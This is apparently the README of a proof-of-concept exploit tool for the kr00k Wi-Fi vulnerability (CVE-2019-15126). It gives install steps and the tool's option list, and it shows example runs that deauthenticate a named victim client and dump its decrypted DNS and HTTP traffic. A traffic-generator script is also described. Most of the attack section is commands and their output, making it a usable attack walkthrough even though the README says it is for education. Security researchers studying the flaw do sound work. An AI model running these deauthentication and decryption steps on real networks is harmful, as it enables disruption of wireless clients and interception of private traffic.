# r00kie-kr00kie


## Disclaimer
This is a PoC exploit for the CVE-2019-15126 kr00k vulnerability.

***This project is intended for educational purposes only and cannot be used for law violation or personal gain.<br/>The author of this project is not responsible for any possible harm caused by the materials.***

## Requirements
To use these scripts, you will need a WiFi card supporting the active monitor mode with frame injection. We recommend the Atheros AR9280 chip (IEEE 802.11n) we used to develop and test the code.
We have tested this PoC on **Kali Linux**

## Installation

```
# clone main repo
git clone https://github.com/hexway/r00kie-kr00kie.git && cd ./r00kie-kr00kie
# install dependencies
sudo pip3 install -r requirements.txt
```

## How to use

### Script: [r00kie-kr00kie.py](https://github.com/hexway/r00kie-kr00kie/blob/master/r00kie-kr00kie.py)

This is the main exploit file that implements the **kr00k** attack 


```bash
->~:python3 r00kie-kr00kie.py -h

usage: r00kie-kr00kie.py [-h] [-i INTERFACE] [-l CHANNEL] [-b BSSID]
                         [-c CLIENT] [-n DEAUTH_NUMBER] [-d DEAUTH_DELAY]
                         [-p PCAP_PATH_READ] [-r PCAP_PATH_RESULT] [-q]

PoC of CVE-2019-15126 kr00k vulnerability

optional arguments:
  -h, --help            show this help message and exit
  -i INTERFACE, --interface INTERFACE
                        Set wireless interface name for listen packets
  -l CHANNEL, --channel CHANNEL
                        Set channel for wireless interface (default: 1)
  -b BSSID, --bssid BSSID
                        Set WiFi AP BSSID (example: "01:23:45:67:89:0a")
  -c CLIENT, --client CLIENT
                        Set WiFi client MAC address (example:
                        "01:23:45:67:89:0b")
  -n DEAUTH_NUMBER, --deauth_number DEAUTH_NUMBER
                        Set number of deauth packets for one iteration
                        (default: 5)
  -d DEAUTH_DELAY, --deauth_delay DEAUTH_DELAY
                        Set delay between sending deauth packets (default: 5)
  -p PCAP_PATH_READ, --pcap_path_read PCAP_PATH_READ
                        Set path to PCAP file for read encrypted packets
  -r PCAP_PATH_RESULT, --pcap_path_result PCAP_PATH_RESULT
                        Set path to PCAP file for write decrypted packets
  -q, --quiet           Minimal output
```


In order to start an attack, you need to know *bssid* of access points, its *channel* and *mac address* of the victim.
You can find them using the `airodump-ng wlan0` utility.


Run the exploit:

```bash
->~:python3 r00kie-kr00kie.py -i wlan0 -b D4:38:9C:82:23:7A -c 88:C9:D0:FB:88:D1 -l 11

      /$$$$$$$   /$$$$$$   /$$$$$$  /$$       /$$
     | $$__  $$ /$$$_  $$ /$$$_  $$| $$      |__/
     | $$  \ $$| $$$$\ $$| $$$$\ $$| $$   /$$ /$$  /$$$$$$
     | $$$$$$$/| $$ $$ $$| $$ $$ $$| $$  /$$/| $$ /$$__  $$
     | $$__  $$| $$\ $$$$| $$\ $$$$| $$$$$$/ | $$| $$$$$$$$
     | $$  \ $$| $$ \ $$$| $$ \ $$$| $$_  $$ | $$| $$_____/
     | $$  | $$|  $$$$$$/|  $$$$$$/| $$ \  $$| $$|  $$$$$$$
     |__/  |__/ \______/  \______/ |__/  \__/|__/ \_______/



 /$$                  /$$$$$$   /$$$$$$  /$$       /$$
| $$                 /$$$_  $$ /$$$_  $$| $$      |__/
| $$   /$$  /$$$$$$ | $$$$\ $$| $$$$\ $$| $$   /$$ /$$  /$$$$$$
| $$  /$$/ /$$__  $$| $$ $$ $$| $$ $$ $$| $$  /$$/| $$ /$$__  $$
| $$$$$$/ | $$  \__/| $$\ $$$$| $$\ $$$$| $$$$$$/ | $$| $$$$$$$$
| $$_  $$ | $$      | $$ \ $$$| $$ \ $$$| $$_  $$ | $$| $$_____/
| $$ \  $$| $$      |  $$$$$$/|  $$$$$$/| $$ \  $$| $$|  $$$$$$$
|__/  \__/|__/       \______/  \______/ |__/  \__/|__/ \_______/
                                                          v0.0.1

                    https://hexway.io/research/r00kie-kr00kie/

[!] Kill processes that prevent monitor mode!
[*] Wireless interface: wlan0 already in mode monitor
[*] Set channel: 11 on wireless interface: wlan0
[*] Send 5 deauth packets to: 88:C9:D0:FB:88:D1 from: D4:38:9C:82:23:7A
[*] Send 5 deauth packets to: 88:C9:D0:FB:88:D1 from: D4:38:9C:82:23:7A
[*] Send 5 deauth packets to: 88:C9:D0:FB:88:D1 from: D4:38:9C:82:23:7A
[+] Got a kr00ked packet:
###[ Ethernet ]###
  dst       = d4:38:9c:82:23:7a
  src       = 88:c9:d0:fb:88:d1
  type      = IPv4
###[ IP ]###
     version   = 4
     ihl       = 5
     tos       = 0x0
     len       = 60
     id        = 30074
     flags     = DF
     frag      = 0
     ttl       = 64
     proto     = udp
     chksum    = 0xcce1
     src       = 192.168.43.161
     dst       = 8.8.4.4
     \options   \
###[ UDP ]###
        sport     = 60744
        dport     = domain
        len       = 40
        chksum    = 0xa649
###[ DNS ]###
           id        = 55281
           qr        = 0
           opcode    = QUERY
           aa        = 0
           tc        = 0
           rd        = 1
           ra        = 0
           z         = 0
           ad        = 0
           cd        = 0
           rcode     = ok
           qdcount   = 1
           ancount   = 0
           nscount   = 0
           arcount   = 0
           \qd        \
            |###[ DNS Question Record ]###
            |  qname     = 'g.whatsapp.net.'
            |  qtype     = A
            |  qclass    = IN
           an        = None
           ns        = None
           ar        = None

[+] Got a kr00ked packet:
###[ Ethernet ]###
  dst       = d4:38:9c:82:23:7a
  src       = 88:c9:d0:fb:88:d1
  type      = IPv4
###[ IP ]###
     version   = 4
     ihl       = 5
     tos       = 0x0
     len       = 60
     id        = 30075
     flags     = DF
     frag      = 0
     ttl       = 64
     proto     = udp
     chksum    = 0xcce0
     src       = 192.168.43.161
     dst       = 8.8.4.4
     \options   \
###[ UDP ]###
        sport     = 60744
        dport     = domain
        len       = 40
        chksum    = 0x104b
###[ DNS ]###
           id        = 28117
           qr        = 0
           opcode    = QUERY
           aa        = 0
           tc        = 0
           rd        = 1
           ra        = 0
           z         = 0
           ad        = 0
           cd        = 0
           rcode     = ok
           qdcount   = 1
           ancount   = 0
           nscount   = 0
           arcount   = 0
           \qd        \
            |###[ DNS Question Record ]###
            |  qname     = 'g.whatsapp.net.'
            |  qtype     = AAAA
            |  qclass    = IN
           an        = None
           ns        = None
           ar        = None
```


Also, if you have already intercepted traffic (pcap file) after the `kr00t` attack, you can decrypt:

```bash
->~:python3 r00kie-kr00kie.py -p encrypted_packets.pcap

      /$$$$$$$   /$$$$$$   /$$$$$$  /$$       /$$
     | $$__  $$ /$$$_  $$ /$$$_  $$| $$      |__/
     | $$  \ $$| $$$$\ $$| $$$$\ $$| $$   /$$ /$$  /$$$$$$
     | $$$$$$$/| $$ $$ $$| $$ $$ $$| $$  /$$/| $$ /$$__  $$
     | $$__  $$| $$\ $$$$| $$\ $$$$| $$$$$$/ | $$| $$$$$$$$
     | $$  \ $$| $$ \ $$$| $$ \ $$$| $$_  $$ | $$| $$_____/
     | $$  | $$|  $$$$$$/|  $$$$$$/| $$ \  $$| $$|  $$$$$$$
     |__/  |__/ \______/  \______/ |__/  \__/|__/ \_______/



 /$$                  /$$$$$$   /$$$$$$  /$$       /$$
| $$                 /$$$_  $$ /$$$_  $$| $$      |__/
| $$   /$$  /$$$$$$ | $$$$\ $$| $$$$\ $$| $$   /$$ /$$  /$$$$$$
| $$  /$$/ /$$__  $$| $$ $$ $$| $$ $$ $$| $$  /$$/| $$ /$$__  $$
| $$$$$$/ | $$  \__/| $$\ $$$$| $$\ $$$$| $$$$$$/ | $$| $$$$$$$$
| $$_  $$ | $$      | $$ \ $$$| $$ \ $$$| $$_  $$ | $$| $$_____/
| $$ \  $$| $$      |  $$$$$$/|  $$$$$$/| $$ \  $$| $$|  $$$$$$$
|__/  \__/|__/       \______/  \______/ |__/  \__/|__/ \_______/
                                                          v0.0.1

                    https://hexway.io/research/r00kie-kr00kie/

[*] Read packets from: encrypted_packets.pcap ....
[*] All packets are read, packet analysis is in progress ....
[+] Got a kr00ked packet:
###[ Ethernet ]###
  dst       = d4:38:9c:82:23:7a
  src       = 88:c9:d0:fb:88:d1
  type      = IPv4
###[ IP ]###
     version   = 4
     ihl       = 5
     tos       = 0x0
     len       = 490
     id        = 756
     flags     = DF
     frag      = 0
     ttl       = 64
     proto     = tcp
     chksum    = 0xd0ca
     src       = 192.168.43.161
     dst       = 1.1.1.1
     \options   \
###[ TCP ]###
        sport     = 34789
        dport     = 1337
        seq       = 3463744441
        ack       = 3909086929
        dataofs   = 8
        reserved  = 0
        flags     = PA
        window    = 1369
        chksum    = 0x65ee
        urgptr    = 0
        options   = [('NOP', None), ('NOP', None), ('Timestamp', (1084858, 699843440))]
###[ Raw ]###
           load      = 'POST /post_form.html HTTP/1.1\r\nHost: sfdsfsdf:1337\r\nConnection: keep-alive\r\nContent-Length: 138240\r\nOrigin: http://sfdsfsdf.ch:1337\r\nUser-Agent: Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36\r\nContent-Type: application/json\r\nAccept: */*\r\nReferer: http://sfdsfsdf.ch:1337/post_form.html\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9,ru;q=0.8\r\n\r\n'

[+] Got a kr00ked packet:
###[ Ethernet ]###
  dst       = d4:38:9c:82:23:7a
  src       = 88:c9:d0:fb:88:d1
  type      = IPv4
###[ IP ]###
     version   = 4
     ihl       = 5
     tos       = 0x0
     len       = 60
     id        = 42533
     flags     = DF
     frag      = 0
     ttl       = 64
     proto     = tcp
     chksum    = 0x2f47
     src       = 192.168.43.161
     dst       = 1.1.1.1
     \options   \
###[ TCP ]###
        sport     = 34792
        dport     = 1337
        seq       = 71773087
        ack       = 0
        dataofs   = 10
        reserved  = 0
        flags     = S
        window    = 65535
        chksum    = 0x97df
        urgptr    = 0
        options   = [('MSS', 1460), ('SAckOK', b''), ('Timestamp', (1084858, 0)), ('NOP', None), ('WScale', 6)]

[+] Got a kr00ked packet:
###[ Ethernet ]###
  dst       = d4:38:9c:82:23:7a
  src       = 88:c9:d0:fb:88:d1
  type      = IPv4
###[ IP ]###
     version   = 4
     ihl       = 5
     tos       = 0x0
     len       = 1460
     id        = 35150
     flags     = DF
     frag      = 0
     ttl       = 64
     proto     = tcp
     chksum    = 0x46a6
     src       = 192.168.43.161
     dst       = 1.1.1.1
     \options   \
###[ TCP ]###
        sport     = 36020
        dport     = 1337
        seq       = 395101552
        ack       = 1111748198
        dataofs   = 8
        reserved  = 0
        flags     = A
        window    = 1369
        chksum    = 0x35d2
        urgptr    = 0
        options   = [('NOP', None), ('NOP', None), ('Timestamp', (1113058, 700129572))]
###[ Raw ]###
           load      = "pik, @default_pass, @_hexway !!! Yeah! It's working! I can read this text! I'm so happy!! Now I'm going to follow all these guys: @_chipik, @default_pass, @_hexway !!! Yeah! It's working! I can read this text! I'm so happy!! Now I'm going to follow all these guys: @_chipik, @default_pass, @_hexway !!! Yeah! It's working! I can read this text! I'm so happy!! Now I'm going to follow all these guys: @_chipik, @default_pass, @_hexway !!! Yeah! It's working! I can read this text! I'm so happy!! Now I'm going to follow all these guys: @_chipik, @default_pass, @_hexway !!! Yeah! It's working! I can read this text! I'm so happy!! Now I'm going to follow all these guys: @_chipik, @default_pass, @_hexway !!! Yeah! It's working! I can read this text! I'm so happy!! Now I'm going to follow all these guys: @_chipik, @default_pass, @_hexway !!! Yeah! It's working! I can read this text! I'm so happy!! Now I'm going to follow all these guys: @_chipik, @default_pass, @_hexway !!! Yeah! It's working! I can read this text! I'm so happy!! Now I'm going to follow all these guys: @_chipik, @default_pass, @_hexway !!! Yeah! It's working! I can read this text! I'm so happy!! Now I'm going to follow all these guys: @_chipik, @default_pass, @_hexway !!! Yeah! It's working! I can read this text! I'm so happy!! Now I'm going to follow all these guys: @_chipik, @default_pass, @_hexway !!! Yeah! It's working! I can"

[+] Got a kr00ked packet:
###[ Ethernet ]###
  dst       = d4:38:9c:82:23:7a
  src       = 88:c9:d0:fb:88:d1
  type      = IPv4
###[ IP ]###
     version   = 4
     ihl       = 5
     tos       = 0x0
     len       = 60
     id        = 17897
     flags     = DF
     frag      = 0
     ttl       = 64
     proto     = tcp
     chksum    = 0x8f83
     src       = 192.168.43.161
     dst       = 95.85.25.177
     \options   \
###[ TCP ]###
        sport     = 36266
        dport     = 1337
        seq       = 3375779416
        ack       = 0
        dataofs   = 10
        reserved  = 0
        flags     = S
        window    = 65535
        chksum    = 0x2c7d
        urgptr    = 0
        options   = [('MSS', 1460), ('SAckOK', b''), ('Timestamp', (1117105, 0)), ('NOP', None), ('WScale', 6)]

[+] Found 4 kr00ked packets and decrypted packets saved in: kr00k.pcap
 ```


### Script: [traffic_generator.py](https://github.com/hexway/r00kie-kr00kie/blob/master/traffic_generator.py)

This script generates `UDP` traffic from the victim, to demonstrate the `kr00k` attack 

```bash
->~:python3 traffic_generator.py
Sending payload to the UDP port 53 on 8.8.8.8
 Press Ctrl+C to exit
```





